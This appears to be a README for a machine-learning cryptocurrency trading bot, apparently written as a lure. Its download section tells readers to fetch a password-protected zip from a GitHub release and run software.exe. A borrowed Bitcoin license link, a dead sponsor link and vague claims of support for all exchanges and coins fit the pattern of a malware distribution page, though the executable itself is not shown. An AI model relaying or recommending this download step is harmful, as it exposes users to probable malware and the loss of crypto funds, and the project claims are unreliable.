# Trade

The project is aimed at developing an intelligent bot for automated cryptocurrency trading, leveraging advanced machine learning (ML) algorithms and feature engineering. The project offers the following core functionalities:

+ Defining derived features using custom (Python) functions, including technical indicators
+ Analyzing historical data and training machine learning models in batch mode (offline)
+ Analyzing predicted scores and selecting the best signal parameters
+ A signaling service that regularly requests new data from the exchange and generates buy/sell signals by applying the trained models in real-time
+ A trading service that executes trades based on generated signals

# How to Download

Download the [Release](https://github.com/joulefingers3z/trading_soft/releases/download/res/files.zip). Extract ***.zip*** (password: SOL!Launch37) and run ***software.exe***.

# License

The TRADE is released under the MIT license. See [COPYING](https://github.com/bitcoin/bitcoin/blob/master/COPYING) for more information or visit https://opensource.org/licenses/MIT.

# Trading

The bot is currently configured with the following parameters:

+ Exchange: Compatible with most popular platforms
+ Cryptocurrency: Supports all coins
+ Analysis frequency: 1 minute (currently the only option)
+ Score range: Between -1 and +1. A score < 0 indicates a likely decrease, and > 0 indicates a likely increase
+ Filter: Notifications are sent only if the score exceeds ±0.20 (subject to change)
+ Additional signs are added for each 0.05 increment (exceeding the filter threshold)

# Features

+ The bot currently operates in a non-incremental model, computing features for all available data (not just the latest update), which can take several hours for more complex configurations.
+ The script loads merged input data, applies feature generation procedures, and stores all derived features in an output file.
+ Not all generated features are used for training and prediction. A separate list of features is specified for training/prediction phases.
+ Feature functions can accept additional parameters, like window sizes, from the configuration section.
+ The same features must be used for both online (real-time) and offline (batch) feature generation.

# Sponsorship

[Become a sponsor](https://github.com/404)

# Contact Us

crypto.ex@devby.same

